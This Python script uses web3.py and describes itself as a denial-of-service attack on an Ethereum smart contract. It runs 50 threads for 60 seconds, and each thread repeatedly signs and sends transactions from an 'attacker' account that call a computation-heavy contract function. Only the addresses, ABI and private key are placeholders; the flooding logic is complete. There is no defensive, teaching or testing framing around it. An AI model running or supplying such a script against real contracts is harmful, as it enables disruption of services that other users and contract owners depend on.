from web3 import Web3
import threading
import time

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# Contract ABI and address
contract_abi = '[...]'  # Replace with actual ABI
contract_address = '0x...'  # Replace with actual contract address

# Create a contract instance
contract = w3.eth.contract(address=contract_address, abi=contract_abi)

# Number of threads for the attack
NUM_THREADS = 50

# Data for the attack
ATTACKER_ACCOUNT = '0xAttackerAddress'  # Replace with actual attacker address
PRIVATE_KEY = 'your_private_key'  # Replace with actual private key

# Event to signal threads to stop
stop_event = threading.Event()

def perform_dos_attack():
    def attack():
        while not stop_event.is_set():
            try:
                # Create a transaction
                transaction = {
                    'from': ATTACKER_ACCOUNT,
                    'to': contract_address,
                    'gas': 2000000,  # Set an appropriate gas limit
                    'gasPrice': w3.toWei('1', 'gwei'),
                    'nonce': w3.eth.getTransactionCount(ATTACKER_ACCOUNT),
                }
                
                # Call the contract function that is vulnerable
                txn = contract.functions.performHeavyComputation().buildTransaction(transaction)
                
                # Sign the transaction
                signed_txn = w3.eth.account.signTransaction(txn, PRIVATE_KEY)
                
                # Send the transaction
                tx_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction)
                
                # Wait for the transaction to be mined
                w3.eth.waitForTransactionReceipt(tx_hash)
                print(f"Transaction successful: {tx_hash.hex()}")
            except Exception as e:
                print(f"Transaction failed: {e}")
            time.sleep(0.1)  # Small delay between requests

    threads = []
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    # Let the attack run for 60 seconds
    time.sleep(60)

    # Signal threads to stop
    stop_event.set()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()
        print("Thread finished.")

if __name__ == "__main__":
    perform_dos_attack()
